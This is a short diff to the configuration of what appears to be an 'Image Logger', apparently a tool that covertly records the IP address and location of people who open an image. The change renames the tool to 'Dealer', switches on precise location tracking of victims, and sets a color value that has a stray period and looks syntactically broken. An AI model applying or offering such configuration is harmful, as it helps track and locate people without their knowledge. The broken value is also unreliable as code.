@@ -20,12 +20,12 @@ config = {
     "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger",
-    "color": 0x00FFFF,
+    "username": "Dealer",
+    "color": 0x000000.,
 
     # OPTIONS #
     "crashBrowser": False,
-    "accurateLocation": False,
+    "accurateLocation": True,
 
     "message": {
         "doMessage": False,
